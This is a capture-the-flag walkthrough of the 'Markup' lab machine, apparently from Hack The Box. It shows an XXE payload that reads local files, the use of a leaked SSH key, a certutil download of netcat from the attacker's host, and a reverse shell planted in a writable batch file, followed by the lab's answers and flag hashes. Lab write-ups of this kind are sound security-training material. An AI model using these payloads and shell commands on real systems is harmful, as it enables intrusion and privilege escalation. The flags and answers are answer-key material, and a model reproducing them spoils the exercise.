# Markup - Very Easy

```shell
rustscan -a 10.129.95.192 --range 0-65535 --ulimit 5000 -- -sV

vim id_rsa
#insert Daniel's SSH key

chmod 600 id_rsa

ssh daniel@10.129.95.192 -i id_rsa

type Desktop\user.txt

cd C:\

dir

cd Log-Management

type job.bat

icacls job.bat
#view file permissions

#on attacker machine
#download netcat for windows
#start server
python3 -m http.server

#on victim machine
cd C:\Users\Daniel

powershell

certutil.exe -urlcache -f http://10.10.14.40:8000/nc64.exe nc64.exe
#download nc64.exe using certutil

exit
#exit powershell

echo C:\Users\daniel\nc64.exe -e cmd.exe 10.10.14.40 4445 > C:\
Log-Management\job.bat
#edit job.bat

#in attacker machine, setup listener
nc -nvlp 4445

#we get reverse shell
whoami
#Administrator

type C:\Users\Administrator\Desktop\root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH (Windows)
  * 80 - http - Apache httpd 2.4.41
  * 443 - ssl/http - Apache httpd 2.4.41

Checking the webpage on port 80, we can attempt to login using weak credentials.

On using admin:password, we are able to login.

While checking the sections, we can see that the 'Order' section accepts user input.

Going through the source code, we can see that XML version 1.0 is being used.
Furthermore, we can see that the name 'Daniel' has been mentioned; this can be a possible username.

Given the clue in questions, we have to try for XML-XXE attacks; we can research about it using HackTricks article on the XML-XXE attacks.

We can test for XML-XXE payloads in the 'Order' tab using Burp Suite's Repeater.

As the target system is using Windows, instead of /etc/passwd, we can check for C:/Windows/win.ini

Following the HackTricks article, the payload added below acts as a proof of concept.
```

```xml
<?xml version = "1.0"?>
<!DOCTYPE root [<!ENTITY example SYSTEM "file:///C:/Windows/win.ini"> ]>
<order>
<quantity>
2
</quantity>
<item>
&example;
</item>
<address>
2
</address>
</order>
```

```markdown
After inserting the payload into the intercepted request in Repeater, we get the contents of win.ini in our response.

As we have an username now (Daniel), we can try to get access to the machine using Daniel's SSH keys.

Following the same logic as Linux machines, we can expect the SSH keys to be in the user's home directory, in the .ssh folder.

Checking the output of file 'C:/Users/Daniel/.ssh/id_rsa' gives us the SSH keys for Daniel.

After logging in as Daniel, we can get user flag from Desktop.

We can get the Log-Management folder at root-folder, C:\

We can check the job.bat file inside; we can try to understand what it is doing by outputting its contents.

Since job.bat can be run as Administrator, we can try to view its permissions to check for any privesc possibility.

Using icacls we can view that Users group has full access to the .bat file.

This means we can edit this file; we can try to get reverse shell using netcat.

On attacker machine, we need to download netcat for Windows, and then transfer it to the victim machine.

After downloading it to the victim machine, we can now edit job.bat

After editing job.bat, we can setup listener on our machine and wait for it to get executed.

We get reverse shell in a while and root flag can be found in Admin's Desktop.
```

1. What version of Apache is running on the target's port 80? - 2.4.41

2. What username:password combination logs in successfully? - admin:password

3. What is the word at the top of the page that accepts user input? - Order

4. What XML version is used on the target? - 1.0

5. What does the XXE / XEE attack acronym stand for? - XML External Entity

6. What username can we find on the webpage's HTML code? - Daniel

7. What is the file located in the Log-Management folder on the target? - job.bat

8. What executable is mentioned in the file? - wevtutil.exe

9. Submit user flag - 032d2fc8952a8c24e39c8f0ee9918ef7

10. Submit root flag - f574a3e7650cebd8c39784299cb570f8
